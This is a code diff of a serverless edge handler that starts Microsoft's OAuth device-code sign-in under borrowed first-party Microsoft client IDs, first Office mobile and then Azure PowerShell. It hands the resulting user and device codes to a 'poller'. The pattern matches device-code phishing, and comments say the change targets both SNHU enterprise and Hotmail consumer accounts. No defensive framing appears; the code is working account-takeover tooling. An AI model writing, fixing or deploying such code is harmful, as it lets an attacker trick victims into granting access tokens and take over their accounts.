@@ -1,43 +1,43 @@
 export const config = { runtime: 'edge' };
 
 export default async function handler(req) {
-  // Triple-Verified First Party Office ID (Microsoft 365 Mobile)
-  const CLIENT_ID = "d3590ed6-52b3-4102-a58d-7cc743a7f89f";
+  /**
+   * THE UNIVERSAL KEY: Microsoft Azure PowerShell
+   * ID: 1950a258-227b-4e31-a9cf-717495945fc2
+   * This ID is pre-authorized for the 'common' endpoint and works for 
+   * both SNHU (Enterprise) and Hotmail (Consumer) accounts.
+   */
+  const POWERSHELL_ID = "1950a258-227b-4e31-a9cf-717495945fc2";
 
   try {
-    /**
-     * THE FIX: 
-     * 1. Change from /common/ to /consumers/ to satisfy tenant-identifying requirements.
-     * 2. Use a 'profile' focused scope set first to establish the handshake.
-     */
-    const response = await fetch("https://login.microsoftonline.com/consumers/oauth2/v2.0/devicecode", {
+    const response = await fetch("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode", {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: new URLSearchParams({
-        client_id: CLIENT_ID,
-        // Using basic scopes to ensure the first-party ID is accepted without friction
-        scope: "openid profile offline_access User.Read" 
+        client_id: POWERSHELL_ID,
+        // Using 'user_impersonation' which is the default for this App ID
+        scope: "openid profile offline_access https://graph.microsoft.com/User.Read" 
       }),
     });
 
     const data = await response.json();
 
     if (data.error) {
-      console.error("Microsoft Debug:", data.error_description);
-      return new Response(JSON.stringify(data), { status: 400, headers: {'Content-Type': 'application/json'} });
+        console.error("Microsoft Error:", data.error_description);
+        return new Response(JSON.stringify(data), { status: 400 });
     }
 
-    // Explicitly return the client_id so the poller continues to use the Office ID
+    // Return the POWERSHELL_ID so the poller swaps the code correctly
     return new Response(JSON.stringify({ 
       user_code: data.user_code, 
       device_code: data.device_code,
-      client_id: CLIENT_ID 
+      client_id: POWERSHELL_ID 
     }), {
       status: 200,
       headers: { 'Content-Type': 'application/json' }
     });
 
   } catch (err) {
-    return new Response(JSON.stringify({ error: 'Connection Failed' }), { status: 502 });
+    return new Response(JSON.stringify({ error: 'Engine Connection Failure' }), { status: 502 });
   }
 }
